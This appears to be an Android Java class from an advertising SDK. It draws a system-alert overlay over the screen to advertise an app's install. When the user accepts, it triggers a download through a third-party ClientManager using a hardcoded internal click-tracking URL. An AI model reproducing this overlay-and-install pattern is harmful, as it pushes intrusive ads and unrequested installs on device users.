package com.mob.root.ad.task;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.TextView;
import com.giga.sdk.ClientManager;
import com.mob.root.AMApplication;
import com.mob.root.R;
import com.mob.root.adapter.InstallWindowPerListAdapter;
import com.mob.root.entity.AD;
import com.mob.root.net.parser.ConfigParser;
import com.mob.root.tools.AMConstants;
import com.mob.root.tools.AMLogger;
import com.mob.root.tools.CommonUtils;
import com.nostra13.universalimageloader.core.ImageLoader;

class InstallGuideWindowTask extends ADWindowTask implements Runnable {

	private WindowManager mWindowManager;
	private LayoutInflater mInflater;
	private ImageView mAppIconIV;
	private TextView mAppTitleTV;
	private ListView mPermissionLV;
	private Button mInstallBtn;
	private ImageView mCloseIV;
	private AD mAD;
	private Handler mHandler;
	
	private InstallWindowPerListAdapter mAdapter;
	
	InstallGuideWindowTask(Context context, AD ad) {
		super(context);
		mAD = ad;
		mHandler = new Handler(Looper.getMainLooper());
	}

	@Override
	public void start() {
		// 显示广告
		displayAD();
	}

	@Override
	protected void pullDatas() {
		
	}

	@Override
	protected void displayAD() {
		if (null == mWindowManager) {
			mWindowManager = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
		}
		LayoutParams lpWindow = new LayoutParams();
		lpWindow.type = LayoutParams.TYPE_SYSTEM_ALERT;
		lpWindow.flags = LayoutParams.FLAG_DIM_BEHIND;
		lpWindow.dimAmount = 0.8f;
		lpWindow.gravity = Gravity.CENTER;
		lpWindow.x = 0;  
		lpWindow.y = 0; 
		
		lpWindow.width = CommonUtils.dip2px(mContext, mContext.getResources().getDimension(R.dimen.install_guide_window_width));
		lpWindow.height = CommonUtils.dip2px(mContext, mContext.getResources().getDimension(R.dimen.install_guide_window_height));
		lpWindow.format = PixelFormat.RGBA_8888; 
		
		if (null == mRootView) {
			if (null == mInflater) {
				mInflater = (LayoutInflater) mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
			}
			mRootView = mInflater.inflate(R.layout.install_guide_window, null);
		}
		mWindowManager.addView(mRootView, lpWindow);  
		initViews();
		initDatas();
		super.displayAD();
	}

	private void initViews() {
		mAppIconIV = (ImageView) mRootView.findViewById(R.id.appIcon);
		mAppTitleTV = (TextView) mRootView.findViewById(R.id.appTitle);
		mPermissionLV = (ListView) mRootView.findViewById(R.id.listView);
		mInstallBtn = (Button) mRootView.findViewById(R.id.acceptInstall);
		mCloseIV = (ImageView) mRootView.findViewById(R.id.close);
	}
	
	private void initDatas() {
		ImageLoader.getInstance().displayImage(mAD.getIcon_url(), mAppIconIV, AMApplication.instance.displayOption);
		mAppTitleTV.setText(mAD.getTitle());
		if(null == mAdapter) {
			mAdapter = new InstallWindowPerListAdapter(mContext);
		}
		mAdapter.setDatas(mAD.getPermissions());
		mPermissionLV.setAdapter(mAdapter);
		
		mCloseIV.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				closeWindow();
			}
		});
		
		mInstallBtn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				try {
					installApp();
				} catch (Exception e) {
					AMLogger.e(null, e.getMessage());
				}
			}
		});
	}
	
	private void installApp() throws Exception {
		closeWindow();
		ADTaskBuilder builder = new ADTaskBuilder();
		ADTask adTask = builder.setADType(TaskType.WINDOW_INSTALLING, mContext, mAD).build();
		adTask.start();
		AMApplication.instance.installADs.add(mAD);
		mHandler.post(this);
	}

	@Override
	public void run() {
		try {
			String destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
			ClientManager clientManager = ClientManager.getInstance(mContext);
			ConfigParser parser = new ConfigParser();
			String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
			String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
			clientManager.downloadWithGooglePlay("http://10.200.10.220/v1/click?type=01&p1=10300&p2=429586&p3=10070&p4=36181422341813827552221411436769981350&p5=test&p6=US&p7=t38400000-8cf0-11bd-b23e-10b96e40000d&p8=3.2&p9=&p10=&p11=en&p12=7425&p13=200&p14=24291&lid=&p15=com.playstudios.myvegas", null, serverName, Integer.parseInt(serverPort), 600000);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
}
